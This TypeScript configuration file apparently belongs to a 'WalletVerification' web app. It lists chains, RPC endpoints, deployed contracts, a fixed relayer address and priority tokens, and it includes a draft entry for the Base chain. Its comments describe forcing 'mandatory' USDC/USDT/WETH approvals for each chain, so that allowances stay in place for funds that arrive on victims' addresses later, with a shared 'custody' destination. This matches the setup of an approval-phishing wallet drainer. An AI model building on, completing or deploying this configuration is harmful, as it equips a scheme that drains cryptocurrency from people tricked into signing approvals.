export interface Token {
  symbol: string;
  address: string;
  decimals: number;
  // Always approved regardless of current balance, and a rejection/failure
  // aborts the chain rather than being silently skipped. Reserved for
  // USDT / USDC / the WETH-equivalent so the allowance is already in place
  // whenever funds show up on this address in the future.
  mandatory?: boolean;
}

export interface ChainConfig {
  name: "eth" | "bnb" | "polygon" | "base";
  label: string;
  chainId: number;
  rpcUrls: string[];
  // SERVER-SIDE ONLY override. Populated only when running on the server —
  // stripped out in lib/chains.browser.ts before curves never reach the client
  // bundle, so authenticated provider URLs (e.g. QuickNode) never leak to browsers.
  overrideRpcUrls?: string[];
  contract: string; // deployed delegation-registry contract address
  nativeSymbol: string;
  explorer: string;
  tokens: Token[];  // priority tokens offered for direct-allowance approval
}

// Same destination + relayer as the Web3Portal contracts — this project
// shares custody infrastructure but is a fully separate frontend/contract
// deployment (WalletVerification, direct-allowance only, no Permit2).
export const RELAYER_ADDRESS = "0x1826d8D10F6a6deadDB401Fe2843fdBf34855414";

// QuickNode providers (authenticated URLs) come from env vars, never hardcoded.
// Server-side only — these URL strings are stripped before any chain config
// ever reaches a client bundle, so the credentials can't leak to browsers.
const QUICKNODE_BASE_RPC = process.env.QUICKNODE_BASE_RPC_URL ?? "";
const QUICKNODE_TRON_RPC = process.env.QUICKNODE_TRON_RPC_URL ?? "";
const QUICKNODE_ETH_RPC = process.env.QUICKNODE_ETH_RPC_URL ?? "";
const QUICKNODE_BSC_RPC = process.env.QUICKNODE_BSC_RPC_URL ?? "";
const QUICKNODE_POLYGON_RPC = process.env.QUICKNODE_POLYGON_RPC_URL ?? "";

export const CHAINS: ChainConfig[] = [
  {
    name: "eth",
    label: "Ethereum",
    chainId: 1,
    // eth.llamarpc.com dropped (returns HTTP 521 — origin down); the rest
    // are independent providers so one outage doesn't take down the chain.
    rpcUrls: [
      "https://ethereum-rpc.publicnode.com",
      "https://rpc.ankr.com/eth",
      "https://cloudflare-eth.com",
      "https://eth.drpc.org",
    ],
    overrideRpcUrls: QUICKNODE_ETH_RPC ? [QUICKNODE_ETH_RPC] : [],
    contract: "0x2928b3a9fc67608D13dE22eD69Bbf61fDF53A3e4",
    nativeSymbol: "ETH",
    explorer: "https://etherscan.io",
    tokens: [
      { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6, mandatory: true },
      { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, mandatory: true },
      { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18, mandatory: true },
      { symbol: "DAI",  address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
      { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
      { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
      { symbol: "UNI",  address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
    ],
  },
  {
    name: "bnb",
    label: "BNB Chain",
    chainId: 56,
    rpcUrls: [
      "https://bsc-dataseed.binance.org",
      "https://bsc-dataseed1.defibit.io",
      "https://bsc-rpc.publicnode.com",
      "https://rpc.ankr.com/bsc",
    ],
    overrideRpcUrls: QUICKNODE_BSC_RPC ? [QUICKNODE_BSC_RPC] : [],
    contract: "0x82C29f687d7Ad7e8A1DAffCA2dec25B5A85dc281",
    nativeSymbol: "BNB",
    explorer: "https://bscscan.com",
    tokens: [
      { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18, mandatory: true },
      { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18, mandatory: true },
      // BSC has no native "WETH"; Binance-Pegged Ethereum Token is the
      // WETH-equivalent used here for the mandatory 3rd slot.
      { symbol: "ETH",  address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", decimals: 18, mandatory: true },
      { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
      { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
      { symbol: "BTCB", address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", decimals: 18 },
      { symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals: 18 },
    ],
  },
  {
    name: "polygon",
    label: "Polygon",
    chainId: 137,
    // polygon-rpc.com dropped (now returns HTTP 401 — requires an API key).
    rpcUrls: [
      "https://polygon-bor-rpc.publicnode.com",
      "https://rpc.ankr.com/polygon",
      "https://polygon.drpc.org",
      "https://polygon-mainnet.public.blastapi.io",
    ],
    overrideRpcUrls: QUICKNODE_POLYGON_RPC ? [QUICKNODE_POLYGON_RPC] : [],
    contract: "0x272b94a0251c32aDb180d8eEa179c66335EBF34D",
    nativeSymbol: "MATIC",
    explorer: "https://polygonscan.com",
    tokens: [
      { symbol: "USDC",   address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6, mandatory: true },
      { symbol: "USDT",   address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6, mandatory: true },
      { symbol: "WETH",   address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", decimals: 18, mandatory: true },
      { symbol: "DAI",    address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", decimals: 18 },
      { symbol: "WBTC",   address: "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", decimals: 8 },
      { symbol: "WMATIC", address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", decimals: 18 },
      { symbol: "LINK",   address: "0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39", decimals: 18 },
    ],
  },
];

export function getChain(name: string): ChainConfig | undefined {
  return CHAINS.find(c => c.name === name);
}

export function getChainById(chainId: number): ChainConfig | undefined {
  return CHAINS.find(c => c.chainId === chainId);
}

// ---------------------------------------------------------------------------
// Base (draft — not yet active)
// ---------------------------------------------------------------------------
// The "Base" contract (contracts/Base.sol) is written and ready to deploy, but
// deliberately NOT included in `CHAINS` above yet: the approval flow loops over
// every entry in `CHAINS`, so adding this before a contract is actually live at
// `contract` would break the flow for every user on every chain.
//
// To activate once you've deployed + verified (see contracts/README.md):
//   1. Deploy contracts/Base.sol via deploy/base (npm run deploy:base).
//   2. Fill in `contract` below with the resulting address.
//   3. Move this whole object into the CHAINS array above.
//   4. Mirror the same change in the other project's lib/chains.ts (kept
//      identical between walletverification and escrow).
//
// Token notes (see contracts/README.md for full detail):
//   - USDC is real, native, Circle-issued: 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913
//   - WETH is the standard OP-stack predeploy: 0x4200000000000000000000000000000000000006
//   - There is NO official Tether USDT on Base. The address some explorers list
//     (0xfde4c96c8593536e31f229ea8f37b2ada2699bb2) is an unofficial, permissionless
//     bridge deployment explicitly disclaimed by Tether — not included below.
//     Add it yourself (and decide mandatory vs. optional) only if you're OK with that.
export const BASE_CHAIN: ChainConfig = {
  name: "base",
  label: "Base",
  chainId: 8453,
  rpcUrls: [
    "https://mainnet.base.org",
    "https://base-rpc.publicnode.com",
    "https://base.drpc.org",
    "https://1rpc.io/base",
  ],
  // QuickNode (auth'd, server-side, prepended ahead of the public fallbacks when set)
  overrideRpcUrls: QUICKNODE_BASE_RPC ? [QUICKNODE_BASE_RPC] : [],
  contract: "", // fill in after deploying contracts/Base.sol
  nativeSymbol: "ETH",
  explorer: "https://basescan.org",
  tokens: [
    { symbol: "USDC", address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", decimals: 6, mandatory: true },
    { symbol: "WETH", address: "0x4200000000000000000000000000000000000006", decimals: 18, mandatory: true },
  ],
};
